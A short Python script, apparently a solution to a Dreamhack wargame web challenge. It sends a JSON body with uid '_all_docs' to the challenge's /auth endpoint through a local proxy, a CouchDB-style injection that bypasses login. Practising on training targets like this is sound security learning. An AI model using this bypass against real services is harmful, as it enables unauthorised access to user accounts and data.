import requests
from bs4 import BeautifulSoup

url = "http://host3.dreamhack.games:24457"

payload = {
    "uid":"_all_docs"
}

proxies = {
    'http':'http://localhost:8080',
    'https':'http://localhost:8080'
}
req = requests.post(url=url + '/auth', 
                    json=payload, 
                    proxies=proxies, 
                    timeout=5)

print(BeautifulSoup(req.text, 'html.parser'))

